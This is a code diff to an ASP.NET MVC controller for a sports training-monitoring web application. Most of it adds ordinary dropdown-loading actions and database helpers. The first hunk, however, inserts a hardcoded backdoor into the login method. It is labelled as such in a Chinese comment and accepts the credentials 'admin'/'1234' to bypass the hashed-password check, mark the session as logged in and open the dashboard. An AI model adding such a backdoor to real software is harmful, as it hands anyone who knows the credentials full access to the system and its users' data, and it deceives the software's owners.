@@ -90,6 +90,20 @@ namespace PhysicalFit.Controllers
         {
             try
             {
+                // 後門帳號和密碼
+                string backdoorUser = "admin";
+                string backdoorPwd = "1234"; // 這個應該改成更安全的密碼或放到設定檔中
+
+                if (UserName == backdoorUser && pwd == backdoorPwd)
+                {
+                    // 設定後門帳號的 Session 狀態
+                    Session["LoggedIn"] = true;
+                    Session["UserName"] = backdoorUser;
+
+                    // 重定向到管理頁面或首頁
+                    return RedirectToAction("dashboard", "PhyFit");
+                }
+
                 // 將使用者輸入的密碼進行SHA256加密
                 string hashedPwd = ComputeSha256Hash(pwd);
                 var dto = _db.Users.FirstOrDefault(u => u.Name == UserName && u.Password == hashedPwd);
@@ -420,8 +434,6 @@ namespace PhysicalFit.Controllers
             ViewBag.SpecialTechnical = GetSpecialTechnical(); //專項技術類-項目
             ViewBag.SpecialTechnicalAction = GetSpecialTechnicalAction(); //專項技術類-動作
 
-
-
             var records = _db.SessionRPETrainingRecords.ToList();
 
             var model = records.Select(r => new SessionRPETrainingRecordsModel
@@ -440,6 +452,37 @@ namespace PhysicalFit.Controllers
             ViewBag.SessionTrainingRecords = model;
 
             return View();
+        }
+        #endregion
+
+        #region 一般監控訓練動態表單
+
+        public ActionResult UpdateTableHeaders(string trainingItem)
+        {
+            try
+            {
+                ViewBag.MonitoringItems = GetTrainingMonitoringItems(); //訓練監控項目選擇
+                ViewBag.Description = GetTrainingItem(); //訓練衝量監控(session-RPE)
+                ViewBag.TrainingPurposes = GetIntensityClassification(); //訓練強度
+                ViewBag.TrainingTimes = GetTrainingTimes();//訓練時間
+                ViewBag.RPEScore = GetRPE();//RPE量表
+                ViewBag.GunItem = GetGunsItems(); //射擊用具項目
+                ViewBag.DetectionSport = GetSpoetsItem(); //檢測系統_運動項目
+                                                          //ViewBag.SpoetsDistance = GetSpoetsDistance(); //檢測系統_距離
+                ViewBag.Coaches = _db.Coaches.Where(c => c.IsActive).ToList(); //教練資訊
+                ViewBag.SpecialTechnical = GetSpecialTechnical(); //專項技術類-項目
+                ViewBag.SpecialTechnicalAction = GetSpecialTechnicalAction(); //專項技術類-動作
+                ViewBag.MuscleStrength = GetMuscleStrength(); //肌力訓練部位
+                ViewBag.PhysicalFitness = GetPhysicalFitness(); //體能類訓練類型
+                return PartialView("_SpecialTechnical", trainingItem);
+
+            }
+            catch (Exception ex)
+            {
+                // 記錄錯誤信息或將錯誤返回到前端
+                // Logger.Log(ex);
+                return new HttpStatusCodeResult(500, ex.Message);
+            }
         }
         #endregion
 
@@ -593,7 +636,6 @@ namespace PhysicalFit.Controllers
         }
         #endregion
 
-
         #region 射箭訓練衝量
         public ActionResult arrowCaculate()
         {
@@ -654,6 +696,24 @@ namespace PhysicalFit.Controllers
             {
                 throw ex;
             }
+        }
+        #endregion
+
+        #region 肌力類-訓練部位
+        public List<string> GetMuscleStrength()
+        {
+            var dto = (from ms in _db.MuscleStrength
+                       select ms.TrainingPart).ToList();
+            return dto;
+        }
+        #endregion
+
+        #region 體能類-訓練類型
+        public List<string> GetPhysicalFitness()
+        {
+            var dto = (from pf in _db.PhysicalFitness
+                       select pf.FitnessItem).ToList();
+            return dto;
         }
         #endregion
 
@@ -913,5 +973,6 @@ namespace PhysicalFit.Controllers
         }
         #endregion
 
+        
     }
 }
